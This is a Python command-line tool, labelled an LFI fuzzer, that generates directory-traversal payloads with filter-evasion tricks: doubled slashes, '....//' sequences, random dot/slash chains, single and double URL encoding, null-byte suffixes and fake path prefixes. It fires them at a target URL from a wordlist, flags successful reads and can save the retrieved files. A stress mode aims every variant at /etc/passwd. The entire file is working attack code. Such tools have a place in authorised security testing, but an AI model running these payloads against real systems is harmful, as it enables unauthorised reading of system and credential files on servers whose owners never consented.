#!/usr/bin/env python3

import argparse
import os
import random
import requests
import urllib
import string
import sys
import time

def random_traversal(n):
    path = '.'
    last_is_dot = False
    dot_running = False
    level = 0

    while True:
        path += random.choice(['.', '/'])

        if path[len(path) - 1] == '.':
            if not dot_running and last_is_dot:
                dot_running = True
                level += 1

                if level >= n:
                    return path + "/"

            last_is_dot = True
        else:
            last_is_dot = False
            dot_running = False


def generate_traversal(method, nb):

    list_prefix = ['../', '..//', '....//']
    path = ''

    if method > len(list_prefix):
        for x in range(nb):
            path += random.choice(list_prefix)
    else:
        path = list_prefix[method] * nb

    return path


def build_payload(filename, nb_parent = 10, urlencode = 0, path_prefix = "",
                append_null = False, traversal_method=0, var=''):

    #evade_remove_backpath = False
    null = "\x00"
    back_to_root = ''

    filename = filename.replace('[VAR]', var)

    if traversal_method == 999:
        back_to_root = random_traversal(nb_parent)
    else:
        back_to_root = generate_traversal(traversal_method, nb_parent)


    payload = back_to_root + filename

    if path_prefix:
        payload = path_prefix + payload

    if append_null:
        payload = payload + urllib.parse.quote(null)


    if urlencode == 1:
        payload = urllib.parse.quote(payload, safe='')
    elif urlencode == 2:
        payload = urllib.parse.quote(payload, safe='')
        payload = urllib.parse.quote(payload, safe='')

    return payload


def check_url(base_url, payload):
    return requests.get(base_url + payload)


def check_result(result, status = None, error_status = None, min_length = None, success_string = None, error_string = None):
    check = True

    if status is not None and result.status_code not in status:
        check = False

    if error_status is not None and result.status_code in error_status:
        check = False

    if min_length is not None and len(result.text) <= min_length:
        check = False

    if success_string is not None and success_string not in result.text:
        check = False

    if error_string is not None and error_string in result.text:
        check = False

    return check


def download(result, payload, folder_dest):

    payload = urllib.parse.unquote(payload)
    filename = payload.replace('/', '_')

    with open(folder_dest + "/" + filename, 'w') as f:
        f.write(result.text)


def main():

    parser = argparse.ArgumentParser(description='LFI Fuzzer')
    parser.add_argument('-u', '--url', required=True, help='URL to fuzz')
    parser.add_argument('-w', '--wordlist', required=True)

    parser.add_argument('-p', '--nb_parent', type=int, default=10, help='Number of times going up in directory tree')
    parser.add_argument('-c', '--urlencode', type=int, default=0, help='0 : no encoding, 1 : normal encoding, 2 : double encoding')
    parser.add_argument('-r', '--path_prefix', default='', help='Real of a fake path to prefix to payload')
    parser.add_argument('-n', '--append_null', action='store_true', help='Add a null char at the URL end')
    parser.add_argument('-m', '--traversal_method', type=int, default=0, help='Traversal method')

    parser.add_argument('-t', '--stress', action='store_true', help='Try multiple method')
    parser.add_argument('-o', '--output', action='store_true', help='Output URLs to STDOUT instead of fetching them')
    parser.add_argument('-d', '--download', metavar='DIRECTORY', help='Download found files in this directory')
    parser.add_argument('-v', '--verbose', action='store_true', help='Show complete payloads')
    parser.add_argument('-a', '--var', help='Show complete payloads')

    parser.add_argument('-s', '--status', default=[200], type=int, action='append', help='Status code allowed')
    parser.add_argument('-e', '--error-status', default=[400,404,500], type=int, action='append', help='Status code to ignore')
    parser.add_argument('-l', '--min-length', default='0', type=int, help='Minimum response length')
    parser.add_argument('-ss', '--success-string', help='Success string to look for')
    parser.add_argument('-es', '--error-string', help='Error/failure string to ignore')

    args = parser.parse_args()

    if args.wordlist and not os.path.isfile(args.wordlist):
        print(f"[-] {args.wordlist} not found")
        exit()

    if args.download and not os.path.isdir(args.download):
        print(f"[-] {args.download} not found")
        exit()


    if args.stress:
        filename = '/etc/passwd'

        for parent in range(6,10):
            for encode in range(3):
                for method in [0,1,2,999]:
                    for prefix in ['', args.path_prefix, 'my_fake_folder/', '/var/www/html/']:

                        payload = build_payload(filename, nb_parent=parent, urlencode=encode, path_prefix=prefix, append_null=False, traversal_method=method)
                        result = check_url(args.url, payload)
                        if check_result(result, args.status, args.error_status, args.min_length, args.success_string, args.error_string):
                            print(f'status {result.status_code}, length {len(result.text)}, payload {payload}')

                        payload = build_payload(filename, nb_parent=parent, urlencode=encode, path_prefix=prefix, append_null=True, traversal_method=method)
                        result = check_url(args.url, payload)
                        if check_result(result, args.status, args.error_status, args.min_length, args.success_string, args.error_string):
                            print(f'status {result.status_code}, length {len(result.text)}, payload {payload}')

        #We're done stressing
        exit()


    #Testing URL with a random payload
    #
    payload = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    print(f'Testing URL with random payload : {payload}')

    result = check_url(args.url, payload.strip())
    print(f'{payload} : status {result.status_code}, length {len(result.text)})')
    time.sleep(0.5)


    f = open(args.wordlist, 'r')

    for filename in f:

        if filename[0] == "#":
            continue

        filename = filename.strip()
        payload = build_payload(filename, nb_parent=args.nb_parent, urlencode=args.urlencode, path_prefix=args.path_prefix, 
                                    append_null=args.append_null, traversal_method=args.traversal_method, var=args.var)

        if args.output:
            print(args.url, payload, sep='')

        else:
            result = check_url(args.url, payload)

            #Only print results successfully passing test(s). No test = output every result
            if check_result(result, args.status, args.error_status, args.min_length, args.success_string, args.error_string):

                if args.verbose:
                    print(f'{filename} : status {result.status_code}, length {len(result.text)}, payload {payload}')
                else:
                    print(f'{filename} : status {result.status_code}, length {len(result.text)}')
                
                if args.download:
                    download(result, filename, args.download)


if __name__ == "__main__":
    main()
